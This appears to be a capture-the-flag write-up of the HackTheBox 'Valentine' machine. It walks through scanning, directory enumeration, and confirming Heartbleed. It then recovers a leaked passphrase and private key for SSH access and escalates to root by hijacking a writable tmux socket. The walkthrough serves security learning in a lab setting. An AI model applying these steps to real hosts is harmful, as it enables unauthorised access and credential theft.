# Recon
```
sudo nmap -sV -sC -O -p- -oN nmap.txt 10.10.10.79  
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/1.png">


# Enumeration
We start a gobuster scan to search for directories:
```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.79
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/7.png">

We find a key file.

<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/2.png">

Decoding it using CyberChef reveals an encrypted private key.

<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/3.png">


# Initital Foothold
We can browse to http://10.10.10.79 to find a image which hints towards a heartbleed attack.. We can try using ```strings```, ```steghide``` and ```file``` to see if there are any hidden messages.
We can check to see if the host is vulnerable by running nmap again:
```
nmap --script vuln 10.10.10.79
```
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/5.png">

We can use a script to get additional in-memory information. Hopefully we can extract some useful information.

> https://gist.github.com/eelsivart/10174134

<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/6.png">

It looks like a base64 encoded string. We can try to decode it.
```
echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d 
```
Which decodes to:
```
heartbleedbelievethehype
```

We can connect as ```hype``` with SSH using the key we decoded.

# Privilege Escalation
<img src="https://raw.githubusercontent.com/vbrunschot/HackTheBox/main/Valentine/assets/8.png">
Although the host is running a vulnerable kernel version we also find tmux to be running. We can use that to escalate our privileges.

> https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0

First check if we have read/write permissions:
```
ls -la /.devs/dev_sess
```
After confirming we run the following command to spawn a root shell:
```
tmux -S /.devs/dev_sess
```









